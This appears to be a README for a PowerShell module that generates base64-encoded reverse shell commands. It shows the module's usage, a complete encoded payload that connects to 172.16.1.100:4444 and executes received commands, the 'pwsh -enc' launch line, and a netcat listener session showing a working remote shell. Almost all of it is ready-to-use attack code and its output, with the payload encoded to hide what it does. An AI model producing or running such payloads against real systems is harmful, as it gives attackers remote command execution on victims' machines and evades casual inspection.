# Simple Powershell Reverse Shell Encoder

To use, simply import the module
```powershell
Import-Module ./new_reverseshell.psm1
```
and then create a new shell where -lhost is the local host and -lport is the listener port
```powershell
New-ReverseShell -lhost "172.16.1.100" -lport 4444
```

## Example Usage
```powershell
┌──(kali㉿kali)-[~]
└─$ pwsh                     
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(kali㉿kali)-[/home/kali]
└─PS> Import-Module ./new_reverseshell.psm1                                                                                                                           

┌──(kali㉿kali)-[/home/kali]
└─PS> New-ReverseShell -lhost "172.16.1.100" -lport 4444                                                                                                              
JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEANwAyAC4AMQA2AC4AMQAuADEAMAAwACIALAA0ADQANAA0ACkAOwAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAD0AWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAB0AD0AKABpAGUAeAAgACIALgAgAHsAIAAkAGQAIAB9ACAAMgA+ACYAMQAiAHwATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJAB0ACsAPQAiACQAcAB3AGQAPgAgACIAOwAkAHMALgBXAHIAaQB0AGUAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJAB0ACkALAAwACwAJAB0AC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA
```
Then to launch the shell run `powershell -enc <base64-text>`
```
┌──(kali㉿kali)-[~]
└─$ pwsh -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEANwAyAC4AMQA2AC4AMQAuADEAMAAwACIALAA0ADQANAA0ACkAOwAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAD0AWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAB0AD0AKABpAGUAeAAgACIALgAgAHsAIAAkAGQAIAB9ACAAMgA+ACYAMQAiAHwATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJAB0ACsAPQAiACQAcAB3AGQAPgAgACIAOwAkAHMALgBXAHIAaQB0AGUAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJAB0ACkALAAwACwAJAB0AC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA
```

A test can be seen below

```sh         
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.16.1.100] from (UNKNOWN) [172.16.1.100] 42452


/home/kali> cd /
/> ls -la
total 1048652
drwxr-xr-x  18 root root       4096 Sep 19 00:53 .
drwxr-xr-x  18 root root       4096 Sep 19 00:53 ..
lrwxrwxrwx   1 root root          7 Aug 12 10:24 bin -> usr/bin
drwxr-xr-x   3 root root       4096 Sep 19 00:54 boot
drwxr-xr-x  17 root root       3220 Sep 21 21:43 dev
drwxr-xr-x 191 root root      12288 Sep 21 21:43 etc
drwxr-xr-x   3 root root       4096 Aug 18 15:57 home
lrwxrwxrwx   1 root root         28 Sep 19 00:53 initrd.img -> boot/initrd.img-6.10.9-amd64
lrwxrwxrwx   1 root root         28 Aug 18 18:29 initrd.img.old -> boot/initrd.img-6.8.11-amd64
lrwxrwxrwx   1 root root          7 Aug 12 10:24 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Aug 18 15:49 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Aug 12 10:24 lib64 -> usr/lib64
drwx------   2 root root      16384 Aug 18 18:25 lost+found
drwxr-xr-x   2 root root       4096 Aug 18 15:37 media
drwxr-xr-x   2 root root       4096 Aug 18 15:37 mnt
drwxr-xr-x   4 root root       4096 Sep 15 06:26 opt
dr-xr-xr-x 281 root root          0 Sep 21 21:43 proc
drwx------  12 root root       4096 Sep 21 18:03 root
drwxr-xr-x  36 root root        880 Sep 21 21:43 run
lrwxrwxrwx   1 root root          8 Aug 12 10:24 sbin -> usr/sbin
drwxr-xr-x   3 root root       4096 Aug 18 15:52 srv
-rw-------   1 root root 1073741824 Aug 18 18:29 swapfile
dr-xr-xr-x  13 root root          0 Sep 21 21:43 sys
drwxrwxrwt  17 root root        460 Sep 21 22:11 tmp
drwxr-xr-x  16 root root       4096 Aug 18 15:49 usr
drwxr-xr-x  12 root root       4096 Sep 13 17:13 var
lrwxrwxrwx   1 root root         25 Sep 19 00:53 vmlinuz -> boot/vmlinuz-6.10.9-amd64
lrwxrwxrwx   1 root root         25 Aug 18 18:29 vmlinuz.old -> boot/vmlinuz-6.8.11-amd64
/> 
```
